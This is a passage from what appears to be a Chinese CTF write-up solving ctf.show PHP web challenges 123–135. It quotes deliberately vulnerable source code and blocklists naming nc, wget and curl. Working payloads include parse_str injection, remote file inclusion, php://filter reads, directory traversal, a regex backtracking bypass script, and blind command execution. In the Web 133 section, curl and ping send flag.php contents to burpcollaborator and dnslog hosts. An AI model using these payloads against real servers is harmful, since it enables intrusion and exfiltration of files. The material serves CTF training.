+<h2 id="1-25-Web-123-—-a-SERVER-‘argv’"><a href="#1-25-Web-123-—-a-SERVER-‘argv’" class="headerlink" title="1.25 Web 123 — $a=$_SERVER[‘argv’];"></a>1.25 Web 123 — $a=$_SERVER[‘argv’];</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=18)&#123;         <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);           <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;             <span class="built_in">echo</span> <span class="variable">$flag</span>;         &#125;    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 变量名应该只有 字母、数字、下划线# GET 或 POST方式传进去的变量名,会自动将 空格 + . [ 转换为 _ ，重点是 仅仅替换一次</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadfun=echo $flag&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2fun=$fl0g=%27flag_give_me%27&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2	#不行CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=var_dump($GLOBALS)			#不行</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>$a=$_SERVER[‘argv’];</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、cli模式（命令行）下	第一个参数<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][0]是脚本名，其余的是传递给脚本的参数2、web网页模式下	在web页模式下必须在php.ini开启register_argc_argv配置项	    设置register_argc_argv = On(默认是Off)，重启服务，<span class="variable">$_SERVER</span>[‘argv’]才会有效果    这时候的<span class="variable">$_SERVER</span>[‘argv’][0] = <span class="variable">$_SERVER</span>[‘QUERY_STRING’]    <span class="variable">$argv</span>,<span class="variable">$argc</span>在web模式下不适用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预期解get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])# 测试&lt;?php$a=$_SERVER[&#x27;argv&#x27;];var_dump($a);传入 a=1+fl0g=flag_give_me结果如下array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 另解POST CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])GET /?$fl0g=flag_give_meGET:?$fl0g=flag_give_mePOST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试 Web php.ini开启register_argc_argv配置项 | 设置register_argc_argv = On</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/10/01/ryjIeQWb8ZNisG4.png" alt="image-20210802110015478"></p>
+<p><img src="https://i.loli.net/2021/08/02/58yCAMVZ7b1dK9N.png" alt="image-20210802110039649"></p>
+<h2 id="1-26-Web-125-—-a-SERVER-‘argv’"><a href="#1-26-Web-125-—-a-SERVER-‘argv’" class="headerlink" title="1.26 Web 125 — $a=$_SERVER[‘argv’];"></a>1.26 Web 125 — $a=$_SERVER[‘argv’];</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=16)&#123;         <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;             <span class="built_in">echo</span> <span class="variable">$flag</span>;         &#125;    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str(<span class="variable">$a</span>[1])</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-27-Web-126-—-a-SERVER-‘argv’"><a href="#1-27-Web-126-—-a-SERVER-‘argv’" class="headerlink" title="1.27 Web 126 — $a=$_SERVER[‘argv’];"></a>1.27 Web 126 — $a=$_SERVER[‘argv’];</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; strlen(<span class="variable">$c</span>)&lt;=16)&#123;         <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);           <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;             <span class="built_in">echo</span> <span class="variable">$flag</span>;         &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str(<span class="variable">$a</span>[1])</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-28-Web-127-—-extract-GET-和-空格-绕过"><a href="#1-28-Web-127-—-extract-GET-和-空格-绕过" class="headerlink" title="1.28 Web 127 — extract($_GET); 和 空格 绕过 _"></a>1.28 Web 127 — extract($_GET); 和 空格 绕过 <code>_</code></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);include(<span class="string">&quot;flag.php&quot;</span>);highlight_file(__FILE__);<span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);<span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];//特殊字符检测<span class="keyword">function</span> waf(<span class="variable">$url</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;</span>|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//<span class="string">&#x27;, $url))&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;if(waf($url))&#123;    die(&quot;嗯哼？&quot;);&#125;else&#123;    extract($_GET);&#125;if($ctf_show===&#x27;</span>ilove36d<span class="string">&#x27;)&#123;    echo $flag;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>‘QUERY_STRING’</p>
+<p>query string（查询字符串），如果有的话，通过它进行页面访问。</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.server.php">https://www.php.net/manual/zh/reserved.variables.server.php</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># + [ . 空格 会变成 _ # extract($_GET); 的作用即是将我们的 GET 传入的参数变成实打实的变量?ctf show=ilove36d</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-29-Web-128-—-gettext-扩展-—-get-defined-vars"><a href="#1-29-Web-128-—-gettext-扩展-—-get-defined-vars" class="headerlink" title="1.29 Web 128 — gettext 扩展 — get_defined_vars()"></a>1.29 Web 128 — gettext 扩展 — get_defined_vars()</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);include(<span class="string">&quot;flag.php&quot;</span>);highlight_file(__FILE__);<span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];<span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];<span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;&#125;<span class="keyword">function</span> check(<span class="variable">$str</span>)&#123;    <span class="built_in">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);&#125; NULL</span><br></pre></td></tr></table></figure>
+
+<p><strong>gettext 扩展</strong></p>
+<ul>
+<li>查看php 扩展目录下是否有 <code>php_gettext.dll</code></li>
+<li>修改 <code>php.ini</code>     <code>extension=php_gettext.dll</code> 去掉注释</li>
+</ul>
+<p><img src="https://i.loli.net/2021/08/02/VJki8tAr4S25wo1.png" alt="image-20210802111723747"></p>
+<p><img src="https://i.loli.net/2021/08/02/qVudQDK9zj1y8iP.png" alt="image-20210802111900412"></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lost-1987/articles/3309693.html">php 下的 gettext 扩展使用</a></p>
+<p>测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpecho gettext(<span class="string">&#x27;phpinfo&#x27;</span>);<span class="built_in">echo</span> _(<span class="string">&#x27;phpinfo&#x27;</span>);?&gt;<span class="comment"># 如果是未定义的字符，则将会返回原字符串root@kali:/var/www/html/learn# vi 3.phproot@kali:/var/www/html/learn# php 3.php phpinfophpinfo</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars( void) : array返回由所有已定义变量所组成的数组 <span class="comment"># 测试&lt;?php$a = get_defined_vars();print_r($a);?&gt;# 返回Array(    [_GET] =&gt; Array        (            [ctfshow] =&gt; ilove36d        )    [_POST] =&gt; Array        (        )    [_COOKIE] =&gt; Array        (        )    [_FILES] =&gt; Array        (        )    [test] =&gt; Success!)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/02/y2R1eQ6kUjBhsAw.png" alt="image-20210802113056976"></p>
+<p><img src="https://i.loli.net/2021/08/02/gzAUSiO4LIex8pJ.png" alt="image-20210802112724073"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars<span class="comment"># 解释var_dump(call_user_func(call_user_func($f1,$f2)));var_dump(call_user_func(call_user_func(&#x27;_&#x27;,&#x27;get_defined_vars&#x27;)));var_dump(call_user_func(get_defined_vars));</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/02/pji4IDPfbUcwMG6.png" alt="image-20210802113207015"></p>
+<h2 id="1-30-Web-129-—-GET-中必须含有某内容"><a href="#1-30-Web-129-—-GET-中必须含有某内容" class="headerlink" title="1.30 Web 129 — GET 中必须含有某内容"></a>1.30 Web 129 — GET 中必须含有某内容</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;0)&#123;        <span class="built_in">echo</span> readfile(<span class="variable">$f</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stripos() <span class="comment"># 查找字符串在另一字符串中第一次出现的位置（不区分大小写）,从0开始</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解一# 远程文件包含 在自己的服务器上写上一句话 test.txt?f=http://url/test.txt?ctfshow</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解二# filter 伪协议?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解三# 目录穿越?f=/ctfshow/../../../../../var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-31-Web-130-—-正则最大回溯次数绕过"><a href="#1-31-Web-130-—-正则最大回溯次数绕过" class="headerlink" title="1.31 Web 130 — 正则最大回溯次数绕过"></a>1.31 Web 130 — 正则最大回溯次数绕过</h2><p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/49631.htm">https://www.jb51.net/article/49631.htm</a></p>
+<p><img src="https://i.loli.net/2021/08/02/w3FPDeNUHBTigRu.png" alt="image-20210802120920025"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">very very very（省略25万个very）ctfshow</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;        die(<span class="string">&#x27;bye!&#x27;</span>);    &#125;    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === FALSE)&#123;        die(<span class="string">&#x27;bye!!&#x27;</span>);    &#125;    <span class="built_in">echo</span> <span class="variable">$flag</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>考察点：<strong>利用正则最大回溯次数绕过</strong></p>
+<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsurl=<span class="string">&quot;http://039253c3-1444-428e-9301-1eadc5f79ab4.challenge.ctf.show:8080/&quot;</span>data=&#123;	<span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*250000+<span class="string">&#x27;ctfshow&#x27;</span>&#125;r=requests.post(url,data=data)<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/02/xq3CMlAumonI9ZU.png" alt="image-20210802115252780"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 非预期解f=ctfshowf[]=ctfshow</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-32-Web-131-—-正则最大回溯次数绕过"><a href="#1-32-Web-131-—-正则最大回溯次数绕过" class="headerlink" title="1.32 Web 131 — 正则最大回溯次数绕过"></a>1.32 Web 131 — 正则最大回溯次数绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;        die(<span class="string">&#x27;bye!&#x27;</span>);    &#125;    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === FALSE)&#123;        die(<span class="string">&#x27;bye!!&#x27;</span>);    &#125;    <span class="built_in">echo</span> <span class="variable">$flag</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsurl=<span class="string">&quot;http://4a5d7bd2-7fc7-4a6f-90bd-8eef9693bf0a.challenge.ctf.show:8080/&quot;</span>data=&#123;    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*250000+<span class="string">&#x27;36Dctfshow&#x27;</span>&#125;r=requests.post(url,data=data)<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-33-Web-132-—-false-amp-amp-false-username-”admin”"><a href="#1-33-Web-132-—-false-amp-amp-false-username-”admin”" class="headerlink" title="1.33 Web 132 — false &amp;&amp; false || $username ===”admin”"></a>1.33 Web 132 — false &amp;&amp; false || $username ===”admin”</h2><p>一个 Web 页面</p>
+<p>扫描后台</p>
+<p><img src="https://i.loli.net/2021/08/02/4sFSywvTBbjpfLm.png" alt="image-20210802121650250"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="comment">#error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;    $username = (String)$_GET[&#x27;username&#x27;];    $password = (String)$_GET[&#x27;password&#x27;];    $code = (String)$_GET[&#x27;code&#x27;];        if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;                if($code == &#x27;admin&#x27;)&#123;            echo $flag;        &#125;            &#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?username=admin&amp;password=1&amp;code=admin</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/02/RX2Dwak1VZC8neG.png" alt="image-20210802121426804"></p>
+<p><img src="https://i.loli.net/2021/08/02/wKxFbDq7QmNTdVX.png" alt="image-20210802121451767"></p>
+<h2 id="1-34-Web-133-—-无回显命令执行"><a href="#1-34-Web-133-—-无回显命令执行" class="headerlink" title="1.34 Web 133 — 无回显命令执行"></a>1.34 Web 133 — 无回显命令执行</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;        <span class="built_in">eval</span>(substr(<span class="variable">$F</span>,0,6));    &#125;<span class="keyword">else</span>&#123;        die(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果传入 ?F=` <span class="variable">$F</span>`;sleep 5则 substr(<span class="variable">$F</span>,0,6) 后得到 ` <span class="variable">$F</span>`;即执行 <span class="built_in">eval</span>(` <span class="variable">$F</span>`;);也就是 <span class="built_in">eval</span>(` ` <span class="variable">$F</span>`;sleep 5`;);而 `` 与 shell_exec() 一致则 <span class="built_in">eval</span>(shell_exec(<span class="string">&quot; ` <span class="variable">$F</span>`;sleep 5&quot;</span>));测试后 真的 执行了 sleep 5</span><br></pre></td></tr></table></figure>
+
+<p>题目转换成：<strong>无回显的命令执行</strong></p>
+<ul>
+<li><p><strong>法一</strong></p>
+<p><img src="https://i.loli.net/2021/08/02/qmGe4jI7o8gZtbd.png" alt="image-20210802123812745"></p>
+<p><img src="https://i.loli.net/2021/08/02/oTXGpwmtyYqZ3rQ.png" alt="image-20210802123843178"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>`;curl -X POST -F xx=@flag.php http://66ahgg5hlpg29qz2ehu6mn5hh8n1bq.burpcollaborator.net?F=`<span class="variable">$F</span>`;+curl -X POST -d<span class="string">&quot;flag=`cat flag.php`&quot;</span> ewe2mcnzf0hwu1l4eepxt26nwe25qu.burpcollaborator.net</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://i.loli.net/2021/10/01/kigqxcs5PmtvYQa.png" alt="image-20210810150448303"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload?F=`$F `;ping `ls | grep flag`.zdvlix.dnslog.cn -c 1?F=`$F `;ping `cat flag.php | grep flag`.zdvlix.dnslog.cn -c 1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-35-Web-134-—-POST-数组覆盖"><a href="#1-35-Web-134-—-POST-数组覆盖" class="headerlink" title="1.35 Web 134 — _POST 数组覆盖"></a>1.35 Web 134 — _POST 数组覆盖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="variable">$key1</span> = 0;<span class="variable">$key2</span> = 0;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || isset(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || isset(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || isset(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;    die(<span class="string">&quot;nonononono&quot;</span>);&#125;@parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);extract(<span class="variable">$_POST</span>);<span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;    die(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试&lt;?phpparse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);var_dump($_POST);# 传参 ?_POST[a]=123</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/08/amteA8lZkHP7svn.png" alt="image-20210808121554476"></p>
+<p><img src="https://i.loli.net/2021/08/02/HYKx5rCNQElveW3.png" alt="image-20210802133330796"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?_POST[key1]=36d&amp;_POST[key2]=36d</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-36-Web-135-—-无回显命令执行-—-写文件-cp-nl"><a href="#1-36-Web-135-—-无回显命令执行-—-写文件-cp-nl" class="headerlink" title="1.36 Web 135 — 无回显命令执行 — 写文件 cp   nl"></a>1.36 Web 135 — 无回显命令执行 — 写文件 cp   nl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web133plus</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;        <span class="built_in">eval</span>(substr(<span class="variable">$F</span>,0,6));    &#125;<span class="keyword">else</span>&#123;        die(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?F=`$F`; cp flag.php 1.txt# 然后访问 1.txt 即可?F=`$F `;nl f*&gt;2.txt</span></span><br></pre></td></tr></table></figure>
+
